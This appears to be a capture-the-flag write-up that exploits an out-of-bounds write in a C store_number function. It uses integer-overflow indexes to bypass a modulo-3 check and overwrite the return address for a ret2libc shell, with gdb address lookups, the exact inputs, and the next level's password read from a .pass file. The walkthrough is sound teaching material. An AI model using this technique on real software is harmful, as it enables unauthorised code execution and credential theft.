In the `store_number` function, we can see that we have an arbitrary
location writing:
```c
int store_number(char *ptr_store)
{
	unsigned int input_index = 0; // esp+28
	unsigned int input_nbr = 0;	  // esp+24

	printf(" Number: ");
	input_nbr = get_unum();
	printf(" Index: ");
	input_index = get_unum();

	if (input_index % 3 == 0 || input_nbr >> 24 == 183)
	{
		puts(" *** ERROR! ***");
		puts("   This index is reserved for wil!");
		puts(" *** ERROR! ***");
		return (1);
	}
	*(ptr_store + (input_index * 4)) = input_nbr;
	return (0);
}
```

We just need to respect two conditions:
1. The index is not divisible by 3.
2. The 8 hightest bits in the number writting should not be equal to 183.

Otherwise, we can write "anywhere" in the memory.

The idea here is to do a `ret2libc` by writting over the return address.

We have `0x1d0` bytes allocated in the stack for ESP, and the `ptr_store` is
located `0x24` bytes after the end of the stack.
This means we need to goes at the index `428 + 4 + 12 = 444` to start writing on
the return address. The `+12` is here because of the stack alignment at the start
of the `main` function.

Let's take the `system` and `/bin/sh` address:
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) i proc map
process 1539
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```

- `system`: `0xf7e6aed0` - `4159090384`
- `/bin/sh`: `0xf7f897ec` - `4160264172`

Also, in GDB, I'll take the return address with `info frame`:
```
(gdb) x/xw 0xffffd71c
0xffffd71c:	0xf7e45513
(gdb) c
```
And the return address is stored here: `0xffffd71c`.

Finally, the buffer address in GDB is: `0xffffd554`

So, the offset is: `456` for the return address and `464` for the `/bin/sh` address.

Now, what we can do is exploiting the overflow made by `input_index * 4`
to add the correct amount of bytes to the default buffer address.

By launching the script in the `Ressources` directory, we can see that we have all these
index values available for the both offset:
```
1073741938 - 456
2147483762 - 456
3221225586 - 456
3221225588 - 464
```

We can now just set the good values at the right places. First write `system`, then `/bin/sh`:

```
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 3221225588
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

Password: `7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`